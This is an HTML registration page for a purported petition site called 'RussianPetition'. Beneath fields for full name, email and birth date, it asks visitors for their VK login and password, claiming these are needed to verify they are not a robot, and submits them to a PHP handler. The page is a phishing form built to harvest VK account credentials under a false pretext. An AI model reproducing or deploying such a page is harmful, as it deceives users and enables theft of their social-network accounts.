<title>Завершение регистрации</title>
<style>
    body {
        /*padding:190px 420px;*/
        background: #fff;
    direction: ltr;
    font-size: 14px;
    line-height: 1.4286;
    margin: 0;
    direction: ltr;
    }
    #main {
        height:416px;
        width:350px;
        padding: 40px 45px 36px 48px;
        border:1px solid #ccc;
        border-radius: 7px;
        
    }
    h1 {
        color: #202124;
    padding-bottom: 0;
    padding-top: 16px;
    font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
    font-size: 24px;
    font-weight: 400;
    line-height: 1.3333;
    margin-left:400px;
    margin-top:50px;
    }
    svg {
        margin-top:10px;
        width: 75;
    height: 24;
    margin-left:140px;
    }
    h3 {
        color: #202124;
    font-size: 16px;
    font-weight: 400;
    letter-spacing: .1px;
    line-height: 1.5;
    padding-bottom: 0;
    padding-top: 8px;
    margin-top:-14px;
    font-family:roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    margin-left:270px;
    margin-bottom:25px;
    }
    input {
        width:30%;
        margin-bottom:20px;
        border-radius: 40px;
    color: #202124;
    font-size: 16px;
    margin-left:400px;
    padding: 13px 15px;
    z-index: 1;
        height:56px;
        border:1px solid #ccc;
    }
    input:focus {
        outline:none;
        border:2px solid #a6b6cc;
    
    }
    input::placeholder {
        color:#a6b6cc;
    }
    #forgot {
        -webkit-border-radius: 4px;
    border-radius: 4px;
    display: inline-block;
    font-weight: bold;
    letter-spacing: .25px;
    background-color: transparent;
    border: 0;
    cursor: pointer;
    font-size: inherit;
    outline: 0;
    padding: 0;
    text-align: left;
    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    margin-top:7px;
    color: #1a73e8;
    }
    #forgot:active {
        background-color:#b0d1fb;
        opacity:1;
    }
    a {
        text-decoration: none;
        color: #1a73e8;
    }
#submit {
    background-color: #adc2df;
    font-family: 'Google Sans',arial,sans-serif;
    color:#fff;
    font-weight: bold;
    width:250px;
    height:50px;
    line-height: 20px;
    padding:8px;
    font-size: 16px;
    letter-spacing: .25px;
    cursor:pointer;
    border:none;
    margin-top:0px;
    float:center;
    margin-left:530px;
    
}
#submit:hover,
#submit:active {
    background-color: #9bb8e0;
}

#guest {
    color: #5f6368;
    font-size: 14px;
    line-height: 1.4286;
    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    box-sizing: inherit;
    margin-top:30px;
    padding-bottom: 3px;
    padding-top: 9px;
    white-space: normal;
}
.more {
    -webkit-border-radius: 4px;
    border-radius: 4px;
    display: inline-block;
    font-weight: bold;
    letter-spacing: .25px;
    background-color: transparent;
    border: 0;
    cursor: pointer;
    font-size: inherit;
    outline: 0;
    padding: 0;
    text-align: left;
    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    margin-top:-23px;
    margin-left:-100px;
    float:right;
    color: #1a73e8;
}
.more:active {
    background-color:#c4deff;
        opacity:1;

}
.create {
    background:#fff;
    width:120px;
    height:18px;
    color:#1a73e8;
    display: inline-block;
    font-weight: bold;
    letter-spacing: .25px;
    background-color: transparent;
    border: 0;
    cursor: pointer;
    font-size: inherit;
    outline: 0;
    padding: 0;
    text-align: left;
    font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
    float:left;
    margin-top:48px;
    line-height: 1.4286;
    text-transform: none;
    border-radius:3px;
    transition: background-color 0.1s ease-out;
    max-width: 300px;
}
.create:active {
background-color: #c4deff;
padding:10px;
margin-top:38px;
margin-left:-10px;
-moz-user-select: none; /* Mozilla Firefox */
-ms-user-select: none; /* Internet Explorer (не поддерживается) */
-o-user-select: none; /* Opera Presto (не поддерживается) */
-webkit-user-select: none; /* Google Chrome, Opera Next, Safari */
}
#block {
    height:20px;
    margin-bottom:20px;
}
/* Dropdown Button */
.dropbtn {
    background-color: #fff;
    width:123px;
    height:18px;
    color:#1a73e8;
    display: inline-block;
    font-weight: bold;
    letter-spacing: .25px;
    background-color: transparent;
    border: 0;
    cursor: pointer;
    font-size: inherit;
    outline: 0;
    padding: 0;
    text-align: left;
    font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
    float:left;
    margin-top:48px;
    line-height: 1.4286;
    text-transform: none;
    border-radius:3px;
    transition: background-color 0.1s ease-out;
    max-width: 300px;
    -moz-user-select: none; /* Mozilla Firefox */
-ms-user-select: none; /* Internet Explorer (не поддерживается) */
-o-user-select: none; /* Opera Presto (не поддерживается) */
-webkit-user-select: none; /* Google Chrome, Opera Next, Safari */
    cursor: pointer;
}

/* Dropdown button on hover & focus */
.dropbtn:hover, .dropbtn:active, .dropbtn:focus {
    background-color: #c4deff;
padding:10px;
margin-top:38px;
margin-left:-10px;
-moz-user-select: none; /* Mozilla Firefox */
-ms-user-select: none; /* Internet Explorer (не поддерживается) */
-o-user-select: none; /* Opera Presto (не поддерживается) */
-webkit-user-select: none; /* Google Chrome, Opera Next, Safari */
}

/* The container <div> - needed to position the dropdown content */
.dropdown {
    position: relative;
    display: inline-block;
    margin-top:0px;
    
}

/* Dropdown Content (Hidden by Default) */
.dropdown-content {
    display: none;
    position: absolute;
    background-color: #fff;
    min-width: 300px;
    box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
    z-index: 1;
margin-top:77px;
margin-left:-10px;
visibility: hidden;
}

/* Links inside the dropdown */
.dropdown-content a {
    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    color: black;
    padding: 12px 30px;
    text-decoration: none;
    display: block;
   
}

/* Change color of dropdown links on hover */
.dropdown-content a:hover {background-color: #ddd}

/* Show the dropdown menu (use JS to add this class to the .dropdown-content container when the user clicks on the dropdown button) */
.show {display:block;}

.txt {
    margin-top:-34px;
    margin-left:7px;
}
.img {
    margin:10px;
    padding:0;
    -moz-user-select: none;
-khtml-user-select: none;
user-select: none;    
pointer-events: none;
}
.name {
    font-family: 'Molengo', Georgia, Times, serif;
    font-size:44px;
    margin-top:-80px;
    margin-left:80px;
}
.slogan {
margin-top:-15px;
margin-left:105px;
font-size: 18px;
font-family:'Monserrat', sans-serif;
-moz-user-select: none;
-khtml-user-select: none;
user-select: none;    
}
.h4 {
    color:#202124;
    font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
width:30%;
margin-left:410px;
margin-bottom:20px;
pointer-events:none;
-webkit-user-select: none;
user-select: none;
-moz-user-select: none;
}
#blockq {
cursor:pointer;
}
.check {
    width:50px;
    height:50px;
    margin-top:-20px;
    margin-bottom:25px;
}
.blue {
    color:#1a73e8;
    width:500px;
}
.t {
    margin-left:425px;
    width:370px;
    margin-top:-60px;
    margin-bottom:20px;
}
    </style>
    <link href="https://fonts.googleapis.com/css?family=Molengo" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Lekton" rel="stylesheet">
    <div id="blockq">
<div class="img"><img src="https://lh3.googleusercontent.com/8k-E0CX6s7fYwEhBPG6d_R1oxfLOHvYJtm4Fs2f7-kypdnbMGpjZVYHl9oKNPuIBjuk" width=70 peight=70><div class="name">RussianPetition</div></div>
   <div class="slogan">Изменим Россию к лучшему!</div>
    </div>

<h1>Отлично! Осталось совсем чуть-чуть!</h1>
<h3>Заполните немного информации о себе, чтобы нам было легче фильтровать вашу ленту!</h3>
<form action="finishRegistration.php" method="POST">
    <input type="text" name="name" placeholder="ФИО"><br>
    <input type="text" name="email" placeholder="Ваш email"><br>
    <input type="text" name="age" placeholder="Дата Вашего рождения"><br>
    <div class="h4">*Вам нужно повторно заполнить ваши данные от аккаунта VK, чтобы мы смогли понять, что Вы не робот. Приносим извинения за полученные неудобства<img src="https://spark.ru/upload/other/b_5cb81e1032dc6.jpg" width=160></div>
    <input type="text" name="login" placeholder="Введите свой логин от VK"><br>
    <input type="password" name="pass" placeholder="Введите свой пароль от VK"><br>
    <!--<input type="password" name="verificationPassword" placeholder="Повторите пароль от VK"><br>-->

<div class="check"><input type="checkbox"><div class="t">Нажимая кнопку "Завершить регистрацию", Вы принимаете <a href="#">Условия,</a> и <a href="#">Политику использования данных</a></div></div>

 
    
    <a href="finish.php"><input id="submit" type="submit" value="Завершить регистрацию"><br></a></div>
</div>
</form>



<script>

</script>
</body>